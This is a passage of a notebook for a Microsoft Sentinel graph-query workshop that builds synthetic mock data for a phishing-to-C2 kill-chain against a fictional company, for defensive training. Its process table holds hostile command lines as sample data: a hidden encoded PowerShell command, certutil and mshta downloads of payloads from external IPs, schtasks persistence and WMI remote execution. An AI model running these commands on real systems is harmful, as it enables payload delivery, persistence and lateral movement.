# Zava-Private Breach — GQL Workshop Uber Graph

> **Platform:** Microsoft Sentinel Custom Graph | **Domain:** Full Kill-Chain | **Data:** 100% Synthetic Mock Data

---

## Purpose

This notebook builds a **single, self-contained graph** that spans every major security domain — identity, email, endpoint, network, and cloud privileges — using **synthetic mock data embedded directly in the notebook**. No live Sentinel workspace is required.

The graph models a realistic **APT kill-chain against the fictional Zava-Private organisation**:

```
Phishing Email  ──►  User clicks URL  ──►  Credential Theft
       │
       └──►  Attacker logs in from external IP  ──►  Risky Sign-In
                        │
                        └──►  Lateral Movement via LOLBin processes
                                        │
                                        └──►  OAuth App self-grants privileges  ──►  Sensitive API calls
                                                                                            │
                                                                                            └──►  DNS C2 Beaconing
```

---

## Node Types (10)

| Node Type | Key | Display | Purpose |
|-----------|-----|---------|--------|
| **User** | `UserId` | `UserPrincipalName` | Employees, attackers, service accounts |
| **Device** | `DeviceId` | `DeviceName` | Workstations & servers |
| **Email** | `EmailId` | `Subject` | Phishing / legitimate emails |
| **Url** | `UrlId` | `Url` | Links inside emails or browser history |
| **Process** | `ProcessId` | `FileName` | Processes spawned on devices |
| **IP** | `IPAddress` | `IPAddress` | Source / destination IPs |
| **Domain** | `DomainName` | `DomainName` | DNS query targets |
| **ServicePrincipal** | `SpId` | `SpName` | OAuth apps / service principals |
| **AppPermission** | `PermissionId` | `PermissionName` | Graph API permissions |
| **Alert** | `AlertId` | `AlertName` | Security alerts raised by any detection |

## Edge Types (16)

| Edge Type | Source → Target | Meaning |
|-----------|----------------|--------|
| **ReceivedEmail** | User → Email | User received this email |
| **SentEmail** | User → Email | Attacker/sender sent this email |
| **ContainsUrl** | Email → Url | Email body contains this link |
| **ClickedUrl** | User → Url | User clicked the link |
| **SignedInFrom** | User → IP | User authenticated from this IP |
| **LoggedInTo** | User → Device | User interactive logon to device |
| **SpawnedProcess** | Process → Process | Parent spawned child process |
| **RanOn** | Process → Device | Process executed on this device |
| **RanAs** | Process → User | Process ran under this user context |
| **QueriedDomain** | Device → Domain | Device made DNS query for domain |
| **ResolvesTo** | Domain → IP | DNS resolution result |
| **OwnsApp** | User → ServicePrincipal | User owns this OAuth application |
| **HasPermission** | ServicePrincipal → AppPermission | SP holds this permission |
| **GrantedPermissionTo** | ServicePrincipal → ServicePrincipal | SP self-granted to another SP |
| **TriggeredAlert** | User → Alert | User activity triggered this alert |
| **DeviceAlert** | Device → Alert | Device activity triggered this alert |

---

## Workshop Learning Path

| Level | Query Topic | Hops |
|-------|------------|------|
| **Beginner** | Find all users who received phishing emails | 1 |
| **Beginner** | Find all URLs in phishing emails | 2 |
| **Intermediate** | Find users who clicked phishing URLs and then signed in from unusual IPs | 3 |
| **Intermediate** | Find processes spawned by LOLBin on compromised devices | 3 |
| **Advanced** | Trace the full kill-chain from phishing email to DNS C2 beacon | 5+ |
| **Advanced** | Find service principals that self-granted permissions after a user was phished | 5+ |
| **Expert** | Full blast-radius: starting from one IP, enumerate all affected users, devices, alerts, app permissions | 6+ |

In [ ]:
# =============================================================================
# Cell 2: Imports & Spark Setup
# NOTE: This notebook uses 100% embedded mock data — no Sentinel workspace needed.
#       Just ensure sentinel_graph is installed in your Databricks cluster.
# =============================================================================

from sentinel_graph.builders import GraphSpecBuilder

from pyspark.sql import SparkSession
from pyspark.sql.functions import (
    col, lit, concat_ws, count,
    min as spark_min, max as spark_max
)
from pyspark.sql.types import (
    StructType, StructField, StringType, IntegerType, DoubleType
)

# Spark is provided automatically in Databricks; this line is a no-op there
spark = SparkSession.builder.getOrCreate()

GRAPH_NAME = "zava_private_breach_workshop_graph"
print(f"Building graph: {GRAPH_NAME}")
print("All data is synthetic — no live Sentinel connection required.")

## Section A — Mock Data: Users & Devices

We define **10 Zava-Private employees**, one attacker account, and **8 devices**. Several threat actors share IPs to create multi-hop attacker paths.

In [ ]:
# =============================================================================
# Cell 4: Mock Data — Users
# UPN format: <initials><digits>@int.zava-private.com
# =============================================================================

user_schema = StructType([
    StructField("UserId",            StringType(), True),
    StructField("UserPrincipalName",  StringType(), True),
    StructField("DisplayName",        StringType(), True),
    StructField("Department",         StringType(), True),
    StructField("JobTitle",           StringType(), True),
    StructField("RiskLevel",          StringType(), True),
    StructField("AccountEnabled",     StringType(), True),
    StructField("nodeType",           StringType(), True),
])

user_rows = [
    # (UserId,              UPN,                                   DisplayName,      Department,   JobTitle,              RiskLevel, AccountEnabled, nodeType)
    ("user-alice",   "alje27@int.zava-private.com",  "Alice Johnson",   "Finance",    "CFO",                 "high",    "true",  "User"),
    ("user-bob",     "bmar45@int.zava-private.com",  "Bob Martinez",    "IT",         "SysAdmin",            "medium",  "true",  "User"),
    ("user-carol",   "csmi12@int.zava-private.com",  "Carol Smith",     "HR",         "HR Manager",          "none",    "true",  "User"),
    ("user-dave",    "dwil89@int.zava-private.com",  "Dave Wilson",     "Engineering","Lead Developer",      "none",    "true",  "User"),
    ("user-eve",     "etho34@int.zava-private.com",  "Eve Thomas",      "Sales",      "Account Executive",   "medium",  "true",  "User"),
    ("user-frank",   "fbro56@int.zava-private.com",  "Frank Brown",     "Finance",    "Finance Analyst",     "none",    "true",  "User"),
    ("user-grace",   "glee78@int.zava-private.com",  "Grace Lee",       "IT",         "Security Engineer",   "none",    "true",  "User"),
    ("user-henry",   "hdav91@int.zava-private.com",  "Henry Davis",     "Exec",       "VP Engineering",      "high",    "true",  "User"),
    ("user-irene",   "iche23@int.zava-private.com",  "Irene Chen",      "Engineering","DevOps Engineer",     "none",    "true",  "User"),
    ("user-svc-01",  "svc-backup@int.zava-private.com", "Backup Service", "IT",       "Service Account",     "none",    "true",  "User"),
    # Attacker masquerading as legitimate-looking external user
    ("user-atk-01",  "support@malicious-actor.io",   "External Support","External",   "Unknown",             "high",    "true",  "User"),
]

user_df = spark.createDataFrame(user_rows, user_schema)
print(f"Users: {user_df.count()}")
user_df.show(truncate=False)

In [ ]:
# =============================================================================
# Cell 5: Mock Data — Devices
# =============================================================================

device_schema = StructType([
    StructField("DeviceId",       StringType(), True),
    StructField("DeviceName",     StringType(), True),
    StructField("OSPlatform",     StringType(), True),
    StructField("ExposureLevel",  StringType(), True),
    StructField("DeviceType",     StringType(), True),
    StructField("IsCompromised",  StringType(), True),
    StructField("nodeType",       StringType(), True),
])

device_rows = [
    ("dev-001", "ALICE-LAPTOP",   "Windows 11",  "High",   "Workstation", "true",  "Device"),
    ("dev-002", "BOB-WORKSTATION","Windows 10",  "Medium", "Workstation", "false", "Device"),
    ("dev-003", "FINANCE-SRV-01", "Windows Server 2022", "High", "Server", "false", "Device"),
    ("dev-004", "DAVE-LAPTOP",    "macOS Ventura","Low",   "Workstation", "false", "Device"),
    ("dev-005", "JUMP-SRV-01",    "Windows Server 2019", "Critical", "Server", "true", "Device"),
    ("dev-006", "DC-CORP-01",     "Windows Server 2022", "Critical", "DomainController", "false", "Device"),
    ("dev-007", "EVE-LAPTOP",     "Windows 11",  "Medium", "Workstation", "false", "Device"),
    ("dev-008", "BUILD-AGENT-01", "Linux Ubuntu 22.04", "Medium", "Server", "false", "Device"),
]

device_df = spark.createDataFrame(device_rows, device_schema)
print(f"Devices: {device_df.count()}")
device_df.show(truncate=False)

## Section B — Mock Data: Email & URL (Phishing)

Three phishing emails sent as part of a spear-phishing campaign. Alice and Eve click the malicious link.

In [ ]:
# =============================================================================
# Cell 7: Mock Data — Emails
# =============================================================================

email_schema = StructType([
    StructField("EmailId",          StringType(), True),
    StructField("Subject",          StringType(), True),
    StructField("SenderAddress",    StringType(), True),
    StructField("RecipientAddress", StringType(), True),
    StructField("DeliveryAction",   StringType(), True),
    StructField("ThreatTypes",      StringType(), True),
    StructField("TimeGenerated",    StringType(), True),
    StructField("nodeType",         StringType(), True),
])

email_rows = [
    ("email-001", "Urgent: Invoice #8821 Requires Approval",
     "billing@zava-private-invoices.net", "alje27@int.zava-private.com", "Delivered", "Phish", "2026-01-10T08:22:00Z", "Email"),
    ("email-002", "Re: Q1 Budget Review - Action Required",
     "billing@zava-private-invoices.net", "etho34@int.zava-private.com", "Delivered", "Phish", "2026-01-10T08:23:00Z", "Email"),
    ("email-003", "Security Alert: Verify Your Account",
     "noreply@zava-private-security-alert.ru", "hdav91@int.zava-private.com", "ZAP",   "Phish", "2026-01-10T09:01:00Z", "Email"),
    ("email-004", "Fw: Shared Document — Q4 Results",
     "bmar45@int.zava-private.com", "csmi12@int.zava-private.com", "Delivered", "None",  "2026-01-10T10:00:00Z", "Email"),
    ("email-005", "Your Azure DevOps build failed",
     "devops-noreply@azure.com", "dwil89@int.zava-private.com", "Delivered", "None",  "2026-01-11T14:15:00Z", "Email"),
]

email_df = spark.createDataFrame(email_rows, email_schema)
print(f"Emails: {email_df.count()}")
email_df.show(truncate=False)

In [ ]:
# =============================================================================
# Cell 8: Mock Data — URLs
# =============================================================================

url_schema = StructType([
    StructField("UrlId",          StringType(), True),
    StructField("Url",            StringType(), True),
    StructField("Verdict",        StringType(), True),
    StructField("ThreatType",     StringType(), True),
    StructField("DomainAge",      StringType(), True),
    StructField("nodeType",       StringType(), True),
])

url_rows = [
    ("url-001", "http://zava-private-invoices.net/verify?token=aG93YXJl", "Malicious", "Phish",   "3 days",  "Url"),
    ("url-002", "http://zava-private-security-alert.ru/reset",             "Malicious", "Phish",   "7 days",  "Url"),
    ("url-003", "https://sharepoint.zava-private.com/sites/finance/Q4",    "Clean",     "None",    "5 years", "Url"),
    ("url-004", "http://185.220.101.45/stage2.ps1",                         "Malicious", "Malware", "1 day",   "Url"),
]

url_df = spark.createDataFrame(url_rows, url_schema)
print(f"URLs: {url_df.count()}")
url_df.show(truncate=False)

## Section C — Mock Data: IPs, Processes, Domains

The attacker authenticates from a Tor exit node (185.220.101.45) and a VPS (91.108.4.0). LOLBin processes are spawned on Alice's laptop and the jump server, and C2 beaconing DNS queries are made to attacker-controlled domains.

In [ ]:
# =============================================================================
# Cell 10: Mock Data — IP Addresses
# =============================================================================

ip_schema = StructType([
    StructField("IPAddress",     StringType(), True),
    StructField("IPType",        StringType(), True),
    StructField("ASN",           StringType(), True),
    StructField("Country",       StringType(), True),
    StructField("IsTorExit",     StringType(), True),
    StructField("ThreatIntel",   StringType(), True),
    StructField("nodeType",      StringType(), True),
])

ip_rows = [
    ("185.220.101.45",  "Public", "AS4766",   "RU", "true",  "C2,Tor",  "IP"),
    ("91.108.4.0",      "Public", "AS59930",  "NL", "false", "C2",      "IP"),
    ("203.0.113.10",    "Public", "AS64512",  "CN", "false", "Scanner", "IP"),
    ("10.0.0.5",        "Private","Internal", "US", "false", "None",    "IP"),
    ("10.0.0.22",       "Private","Internal", "US", "false", "None",    "IP"),
    ("10.0.0.101",      "Private","Internal", "US", "false", "None",    "IP"),
    ("52.168.0.1",      "Public", "AS8075",   "US", "false", "None",    "IP"),   # Azure IP (legitimate)
]

ip_df = spark.createDataFrame(ip_rows, ip_schema)
print(f"IPs: {ip_df.count()}")
ip_df.show(truncate=False)

In [ ]:
# =============================================================================
# Cell 11: Mock Data — Processes
# =============================================================================

process_schema = StructType([
    StructField("ProcessId",      StringType(), True),
    StructField("FileName",       StringType(), True),
    StructField("CommandLine",    StringType(), True),
    StructField("SHA256",         StringType(), True),
    StructField("IsLolBin",       StringType(), True),
    StructField("Technique",      StringType(), True),
    StructField("TimeGenerated",  StringType(), True),
    StructField("nodeType",       StringType(), True),
])

process_rows = [
    # Process tree on ALICE-LAPTOP: Outlook -> powershell (LOLBin) -> certutil -> cmd
    ("proc-001", "outlook.exe",    "C:\\Program Files\\Microsoft Office\\outlook.exe",
     "a1b2c3d4e5", "false", "None",                   "2026-01-10T08:35:00Z", "Process"),
    ("proc-002", "powershell.exe", "powershell.exe -nop -w hidden -enc JABjAD...",
     "deadbeef01", "true",  "T1059.001 - PowerShell",  "2026-01-10T08:36:00Z", "Process"),
    ("proc-003", "certutil.exe",   "certutil.exe -urlcache -split -f http://185.220.101.45/stage2.ps1 C:\\Temp\\s.ps1",
     "feedface02", "true",  "T1105 - Ingress Transfer","2026-01-10T08:37:00Z", "Process"),
    ("proc-004", "cmd.exe",        "cmd.exe /c whoami && net user",
     "cafe1234ab", "false", "T1033 - System Owner",    "2026-01-10T08:38:00Z", "Process"),
    # Lateral movement on JUMP-SRV-01: schtasks creates persistence
    ("proc-005", "schtasks.exe",   "schtasks /create /tn Updater /tr C:\\Temp\\update.exe /sc minute /mo 5",
     "babe5678cd", "true",  "T1053.005 - Scheduled Task","2026-01-10T09:45:00Z", "Process"),
    ("proc-006", "wmic.exe",       "wmic /node:10.0.0.22 process call create \"cmd.exe /c ...\"",
     "deaf9012ef", "true",  "T1047 - WMI",             "2026-01-10T09:46:00Z", "Process"),
    ("proc-007", "mshta.exe",      "mshta.exe http://91.108.4.0/payload.hta",
     "b00b3456gh", "true",  "T1218.005 - Mshta",       "2026-01-10T09:47:00Z", "Process"),
    # Legitimate processes for contrast
    ("proc-008", "explorer.exe",   "C:\\Windows\\Explorer.EXE",
     "clean001aa", "false", "None",                   "2026-01-10T07:00:00Z", "Process"),
    ("proc-009", "chrome.exe",     "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer",
     "clean002bb", "false", "None",                   "2026-01-10T08:30:00Z", "Process"),
]

process_df = spark.createDataFrame(process_rows, process_schema)
print(f"Processes: {process_df.count()}")
process_df.show(truncate=False)

In [ ]:
# =============================================================================
# Cell 12: Mock Data — Domains (DNS Query Targets)
# =============================================================================

domain_schema = StructType([
    StructField("DomainName",    StringType(), True),
    StructField("DomainType",    StringType(), True),
    StructField("IsMalicious",   StringType(), True),
    StructField("Registrar",     StringType(), True),
    StructField("DomainAge",     StringType(), True),
    StructField("nodeType",      StringType(), True),
])

domain_rows = [
    # C2 / attacker infrastructure
    ("c2-beacon.xyz",              "C2",         "true",  "NameCheap RU",  "5 days",  "Domain"),
    ("update-svc.ddns.net",        "C2",         "true",  "DynDNS",        "12 days", "Domain"),
    ("api.zava-private-invoices.net",  "Phish",  "true",  "GoDaddy",       "3 days",  "Domain"),
    ("zava-private-security-alert.ru",  "Phish", "true",  "REG.RU",        "7 days",  "Domain"),
    # DGA-like subdomain beaconing
    ("a3f7b2c1.c2-beacon.xyz",     "C2-DGA",     "true",  "NameCheap RU",  "5 days",  "Domain"),
    ("d9e1a4f8.c2-beacon.xyz",     "C2-DGA",     "true",  "NameCheap RU",  "5 days",  "Domain"),
    ("b5c6d7e2.c2-beacon.xyz",     "C2-DGA",     "true",  "NameCheap RU",  "5 days",  "Domain"),
    # Legitimate domains for contrast
    ("microsoft.com",              "Legitimate", "false", "MarkMonitor",   "25 years", "Domain"),
    ("azure.com",                  "Legitimate", "false", "MarkMonitor",   "20 years", "Domain"),
    ("sharepoint.zava-private.com","Internal",   "false", "Internal",      "10 years", "Domain"),
]

domain_df = spark.createDataFrame(domain_rows, domain_schema)
print(f"Domains: {domain_df.count()}")
domain_df.show(truncate=False)

## Section D — Mock Data: Identity & Privilege (OAuth / Service Principals)

An attacker-controlled OAuth application (`ZavaPrivateHelperApp`) abuses **AppRoleAssignment.ReadWrite.All** to self-grant **RoleManagement.ReadWrite.Directory**, replicating the CVE-2025-55241 pattern.

In [ ]:
# =============================================================================
# Cell 14: Mock Data — Service Principals
# =============================================================================

sp_schema = StructType([
    StructField("SpId",           StringType(), True),
    StructField("SpName",         StringType(), True),
    StructField("SpType",         StringType(), True),
    StructField("IsThirdParty",   StringType(), True),
    StructField("RiskLevel",      StringType(), True),
    StructField("CreatedDate",    StringType(), True),
    StructField("nodeType",       StringType(), True),
])

sp_rows = [
    ("sp-001", "ZavaPrivateHelperApp",  "Application", "false", "high",   "2026-01-05", "ServicePrincipal"),
    ("sp-002", "DataSyncService",       "Application", "false", "medium", "2025-06-01", "ServicePrincipal"),
    ("sp-003", "ExternalAuditConnector","Application", "true",  "high",   "2026-01-08", "ServicePrincipal"),
    ("sp-004", "MicrosoftGraphDelegated","Application","false", "none",   "2020-01-01", "ServicePrincipal"),
    ("sp-005", "BackupAutomation",      "ManagedIdentity","false","none", "2024-03-15", "ServicePrincipal"),
]

sp_df = spark.createDataFrame(sp_rows, sp_schema)
print(f"Service Principals: {sp_df.count()}")
sp_df.show(truncate=False)

In [ ]:
# =============================================================================
# Cell 15: Mock Data — App Permissions
# =============================================================================

perm_schema = StructType([
    StructField("PermissionId",    StringType(), True),
    StructField("PermissionName",  StringType(), True),
    StructField("Scope",           StringType(), True),
    StructField("RiskRating",      StringType(), True),
    StructField("IsTierZero",      StringType(), True),
    StructField("nodeType",        StringType(), True),
])

perm_rows = [
    ("perm-001", "AppRoleAssignment.ReadWrite.All", "Application", "Critical", "true",  "AppPermission"),
    ("perm-002", "RoleManagement.ReadWrite.Directory", "Application", "Critical", "true", "AppPermission"),
    ("perm-003", "User.ReadWrite.All",              "Application", "High",     "false", "AppPermission"),
    ("perm-004", "Mail.ReadWrite",                  "Application", "High",     "false", "AppPermission"),
    ("perm-005", "Directory.ReadWrite.All",          "Application", "Critical", "true",  "AppPermission"),
    ("perm-006", "AuditLog.Read.All",                "Application", "Medium",   "false", "AppPermission"),
    ("perm-007", "User.Read",                        "Delegated",   "Low",      "false", "AppPermission"),
]

perm_df = spark.createDataFrame(perm_rows, perm_schema)
print(f"Permissions: {perm_df.count()}")
perm_df.show(truncate=False)

## Section E — Mock Data: Alerts

Alerts are raised by various detections (Defender, Sentinel analytics rules, MDE) across the kill-chain.

In [ ]:
# =============================================================================
# Cell 17: Mock Data — Alerts
# =============================================================================

alert_schema = StructType([
    StructField("AlertId",        StringType(), True),
    StructField("AlertName",      StringType(), True),
    StructField("Severity",       StringType(), True),
    StructField("Tactic",         StringType(), True),
    StructField("Technique",      StringType(), True),
    StructField("Status",         StringType(), True),
    StructField("TimeGenerated",  StringType(), True),
    StructField("nodeType",       StringType(), True),
])

alert_rows = [
    ("alert-001", "Phishing Email Delivered",                    "Medium", "InitialAccess",       "T1566", "Closed",   "2026-01-10T08:22:00Z", "Alert"),
    ("alert-002", "User Clicked Phishing URL",                   "High",   "InitialAccess",       "T1566", "Active",   "2026-01-10T08:36:00Z", "Alert"),
    ("alert-003", "Suspicious PowerShell encoded command",        "High",   "Execution",           "T1059.001", "Active","2026-01-10T08:36:30Z", "Alert"),
    ("alert-004", "CertUtil download of remote payload",          "High",   "CommandAndControl",   "T1105", "Active",   "2026-01-10T08:37:05Z", "Alert"),
    ("alert-005", "Impossible Travel — Sign-in from Russia",      "High",   "CredentialAccess",    "T1078", "Active",   "2026-01-10T08:45:00Z", "Alert"),
    ("alert-006", "Scheduled Task Created for Persistence",       "Medium", "Persistence",         "T1053", "Active",   "2026-01-10T09:45:10Z", "Alert"),
    ("alert-007", "WMI Lateral Movement Detected",                "High",   "LateralMovement",     "T1047", "Active",   "2026-01-10T09:46:05Z", "Alert"),
    ("alert-008", "OAuth App Self-Granted Critical Permissions",  "Critical","PrivilegeEscalation","T1098.003","Active","2026-01-10T10:15:00Z", "Alert"),
    ("alert-009", "DNS Beaconing Pattern Detected",               "High",   "CommandAndControl",   "T1071.004","Active","2026-01-10T11:00:00Z", "Alert"),
]

alert_df = spark.createDataFrame(alert_rows, alert_schema)
print(f"Alerts: {alert_df.count()}")
alert_df.show(truncate=False)

## Section F — Build Edge DataFrames

Each edge DataFrame is a flat table with source key, target key, and edge properties. All keys must exactly match the `key=` field of the corresponding node type.

In [ ]:
# =============================================================================
# Cell 19: Edges — Email relationships
# =============================================================================

email_edge_schema = StructType([
    StructField("UserId",   StringType(), True),
    StructField("EmailId",  StringType(), True),
    StructField("EdgeKey",  StringType(), True),
    StructField("edgeType", StringType(), True),
])

# ReceivedEmail: User -> Email
received_email_rows = [
    ("user-alice", "email-001", "user-alice_email-001", "ReceivedEmail"),
    ("user-eve",   "email-002", "user-eve_email-002",   "ReceivedEmail"),
    ("user-henry", "email-003", "user-henry_email-003", "ReceivedEmail"),
    ("user-carol", "email-004", "user-carol_email-004", "ReceivedEmail"),
    ("user-dave",  "email-005", "user-dave_email-005",  "ReceivedEmail"),
]
received_email_df = spark.createDataFrame(received_email_rows, email_edge_schema)

# SentEmail: User -> Email (attacker sent phishing + bob sent internal)
sent_email_rows = [
    ("user-atk-01", "email-001", "user-atk-01_email-001", "SentEmail"),
    ("user-atk-01", "email-002", "user-atk-01_email-002", "SentEmail"),
    ("user-atk-01", "email-003", "user-atk-01_email-003", "SentEmail"),
    ("user-bob",    "email-004", "user-bob_email-004",    "SentEmail"),
]
sent_email_df = spark.createDataFrame(sent_email_rows, email_edge_schema)

print(f"ReceivedEmail edges: {received_email_df.count()}")
print(f"SentEmail edges: {sent_email_df.count()}")

In [ ]:
# =============================================================================
# Cell 20: Edges — URL relationships
# =============================================================================

# ContainsUrl: Email -> Url
contains_url_schema = StructType([
    StructField("EmailId",  StringType(), True),
    StructField("UrlId",    StringType(), True),
    StructField("EdgeKey",  StringType(), True),
    StructField("edgeType", StringType(), True),
])
contains_url_rows = [
    ("email-001", "url-001", "email-001_url-001", "ContainsUrl"),
    ("email-002", "url-001", "email-002_url-001", "ContainsUrl"),
    ("email-003", "url-002", "email-003_url-002", "ContainsUrl"),
    ("email-004", "url-003", "email-004_url-003", "ContainsUrl"),
]
contains_url_df = spark.createDataFrame(contains_url_rows, contains_url_schema)

# ClickedUrl: User -> Url
clicked_url_schema = StructType([
    StructField("UserId",   StringType(), True),
    StructField("UrlId",    StringType(), True),
    StructField("EdgeKey",  StringType(), True),
    StructField("edgeType", StringType(), True),
    StructField("TimeClicked", StringType(), True),
])
clicked_url_rows = [
    ("user-alice", "url-001", "user-alice_url-001", "ClickedUrl", "2026-01-10T08:36:00Z"),
    ("user-eve",   "url-001", "user-eve_url-001",   "ClickedUrl", "2026-01-10T08:40:00Z"),
]
clicked_url_df = spark.createDataFrame(clicked_url_rows, clicked_url_schema)

print(f"ContainsUrl edges: {contains_url_df.count()}")
print(f"ClickedUrl edges: {clicked_url_df.count()}")

In [ ]:
# =============================================================================
# Cell 21: Edges — Sign-in & Logon relationships
# =============================================================================

# SignedInFrom: User -> IP
signin_schema = StructType([
    StructField("UserId",        StringType(), True),
    StructField("IPAddress",     StringType(), True),
    StructField("EdgeKey",       StringType(), True),
    StructField("edgeType",      StringType(), True),
    StructField("SignInCount",   StringType(), True),
    StructField("FirstSeen",     StringType(), True),
    StructField("LastSeen",      StringType(), True),
    StructField("IsRisky",       StringType(), True),
])
signin_rows = [
    # Attacker using Alice's credentials from Tor exit node
    ("user-alice",   "185.220.101.45", "user-alice_185.220.101.45",   "SignedInFrom", "3",  "2026-01-10T08:44:00Z", "2026-01-10T11:00:00Z", "true"),
    # Attacker also authenticates from VPS
    ("user-alice",   "91.108.4.0",     "user-alice_91.108.4.0",       "SignedInFrom", "1",  "2026-01-10T09:30:00Z", "2026-01-10T09:30:00Z", "true"),
    # Eve also attacked
    ("user-eve",     "185.220.101.45", "user-eve_185.220.101.45",     "SignedInFrom", "1",  "2026-01-10T08:50:00Z", "2026-01-10T08:50:00Z", "true"),
    # Normal sign-ins for other users
    ("user-bob",     "10.0.0.5",       "user-bob_10.0.0.5",           "SignedInFrom", "42", "2026-01-01T09:00:00Z", "2026-01-12T18:00:00Z", "false"),
    ("user-dave",    "10.0.0.101",     "user-dave_10.0.0.101",        "SignedInFrom", "38", "2026-01-01T09:00:00Z", "2026-01-12T18:00:00Z", "false"),
    ("user-grace",   "10.0.0.22",      "user-grace_10.0.0.22",        "SignedInFrom", "55", "2026-01-01T09:00:00Z", "2026-01-12T18:00:00Z", "false"),
    # Attacker's actual account
    ("user-atk-01",  "185.220.101.45", "user-atk-01_185.220.101.45",  "SignedInFrom", "12", "2026-01-09T20:00:00Z", "2026-01-12T03:00:00Z", "true"),
]
signin_df = spark.createDataFrame(signin_rows, signin_schema)

# LoggedInTo: User -> Device
logon_schema = StructType([
    StructField("UserId",      StringType(), True),
    StructField("DeviceId",    StringType(), True),
    StructField("EdgeKey",     StringType(), True),
    StructField("edgeType",    StringType(), True),
    StructField("LogonType",   StringType(), True),
    StructField("FirstSeen",   StringType(), True),
    StructField("LastSeen",    StringType(), True),
])
logon_rows = [
    ("user-alice", "dev-001", "user-alice_dev-001", "LoggedInTo", "Interactive",  "2026-01-10T07:30:00Z", "2026-01-10T17:00:00Z"),
    ("user-bob",   "dev-002", "user-bob_dev-002",   "LoggedInTo", "Interactive",  "2026-01-10T08:00:00Z", "2026-01-10T18:00:00Z"),
    ("user-dave",  "dev-004", "user-dave_dev-004",  "LoggedInTo", "Interactive",  "2026-01-10T08:00:00Z", "2026-01-10T17:00:00Z"),
    ("user-grace", "dev-005", "user-grace_dev-005", "LoggedInTo", "Interactive",  "2026-01-10T08:00:00Z", "2026-01-10T17:00:00Z"),
    ("user-alice", "dev-005", "user-alice_dev-005", "LoggedInTo", "RemoteInteractive","2026-01-10T09:40:00Z", "2026-01-10T10:30:00Z"),
    ("user-bob",   "dev-006", "user-bob_dev-006",   "LoggedInTo", "Network",      "2026-01-10T09:00:00Z", "2026-01-10T09:05:00Z"),
    ("user-svc-01","dev-003", "user-svc-01_dev-003","LoggedInTo", "Service",      "2026-01-10T00:00:00Z", "2026-01-10T23:59:00Z"),
]
logon_df = spark.createDataFrame(logon_rows, logon_schema)

print(f"SignedInFrom edges: {signin_df.count()}")
print(f"LoggedInTo edges: {logon_df.count()}")

In [ ]:
# =============================================================================
# Cell 22: Edges — Process tree relationships
# =============================================================================

# SpawnedProcess: Process -> Process (parent->child)
spawned_schema = StructType([
    StructField("ParentProcessId", StringType(), True),
    StructField("ChildProcessId",  StringType(), True),
    StructField("EdgeKey",         StringType(), True),
    StructField("edgeType",        StringType(), True),
    StructField("TimeGenerated",   StringType(), True),
])
spawned_rows = [
    ("proc-001", "proc-002", "proc-001_proc-002", "SpawnedProcess", "2026-01-10T08:36:00Z"),  # outlook -> powershell
    ("proc-002", "proc-003", "proc-002_proc-003", "SpawnedProcess", "2026-01-10T08:37:00Z"),  # powershell -> certutil
    ("proc-002", "proc-004", "proc-002_proc-004", "SpawnedProcess", "2026-01-10T08:38:00Z"),  # powershell -> cmd
    ("proc-004", "proc-005", "proc-004_proc-005", "SpawnedProcess", "2026-01-10T09:45:00Z"),  # cmd -> schtasks
    ("proc-004", "proc-006", "proc-004_proc-006", "SpawnedProcess", "2026-01-10T09:46:00Z"),  # cmd -> wmic
    ("proc-006", "proc-007", "proc-006_proc-007", "SpawnedProcess", "2026-01-10T09:47:00Z"),  # wmic -> mshta (on remote system)
    ("proc-008", "proc-009", "proc-008_proc-009", "SpawnedProcess", "2026-01-10T08:30:00Z"),  # explorer -> chrome (benign)
]
spawned_df = spark.createDataFrame(spawned_rows, spawned_schema)

# RanOn: Process -> Device
ranon_schema = StructType([
    StructField("ProcessId", StringType(), True),
    StructField("DeviceId",  StringType(), True),
    StructField("EdgeKey",   StringType(), True),
    StructField("edgeType",  StringType(), True),
])
ranon_rows = [
    ("proc-001", "dev-001", "proc-001_dev-001", "RanOn"),  # outlook on Alice's laptop
    ("proc-002", "dev-001", "proc-002_dev-001", "RanOn"),  # powershell on Alice's laptop
    ("proc-003", "dev-001", "proc-003_dev-001", "RanOn"),  # certutil on Alice's laptop
    ("proc-004", "dev-001", "proc-004_dev-001", "RanOn"),  # cmd on Alice's laptop
    ("proc-005", "dev-005", "proc-005_dev-005", "RanOn"),  # schtasks on jump server (lateral move)
    ("proc-006", "dev-005", "proc-006_dev-005", "RanOn"),  # wmic on jump server
    ("proc-007", "dev-006", "proc-007_dev-006", "RanOn"),  # mshta on DC (via WMI remote exec)
    ("proc-008", "dev-001", "proc-008_dev-001", "RanOn"),  # explorer on Alice's laptop (benign)
    ("proc-009", "dev-001", "proc-009_dev-001", "RanOn"),  # chrome on Alice's laptop (benign)
]
ranon_df = spark.createDataFrame(ranon_rows, ranon_schema)

# RanAs: Process -> User
ranas_schema = StructType([
    StructField("ProcessId", StringType(), True),
    StructField("UserId",    StringType(), True),
    StructField("EdgeKey",   StringType(), True),
    StructField("edgeType",  StringType(), True),
])
ranas_rows = [
    ("proc-001", "user-alice",  "proc-001_user-alice",  "RanAs"),
    ("proc-002", "user-alice",  "proc-002_user-alice",  "RanAs"),
    ("proc-003", "user-alice",  "proc-003_user-alice",  "RanAs"),
    ("proc-004", "user-alice",  "proc-004_user-alice",  "RanAs"),
    ("proc-005", "user-alice",  "proc-005_user-alice",  "RanAs"),  # attacker using Alice's creds on jump server
    ("proc-006", "user-alice",  "proc-006_user-alice",  "RanAs"),
    ("proc-007", "user-svc-01", "proc-007_user-svc-01", "RanAs"),  # wmi remote exec uses service account
    ("proc-008", "user-alice",  "proc-008_user-alice",  "RanAs"),
    ("proc-009", "user-alice",  "proc-009_user-alice",  "RanAs"),
]
ranas_df = spark.createDataFrame(ranas_rows, ranas_schema)

print(f"SpawnedProcess edges: {spawned_df.count()}")
print(f"RanOn edges: {ranon_df.count()}")
print(f"RanAs edges: {ranas_df.count()}")

In [ ]:
# =============================================================================
# Cell 23: Edges — DNS & Network relationships
# =============================================================================

# QueriedDomain: Device -> Domain
dns_query_schema = StructType([
    StructField("DeviceId",        StringType(), True),
    StructField("DomainName",      StringType(), True),
    StructField("EdgeKey",         StringType(), True),
    StructField("edgeType",        StringType(), True),
    StructField("QueryCount",      StringType(), True),
    StructField("MeanIntervalSec", StringType(), True),  # beaconing metric
    StructField("CoeffVariation",  StringType(), True),  # low = beacon
    StructField("FirstSeen",       StringType(), True),
    StructField("LastSeen",        StringType(), True),
])
dns_rows = [
    # Alice's laptop beaconing to C2 -- highly regular (CV < 0.1)
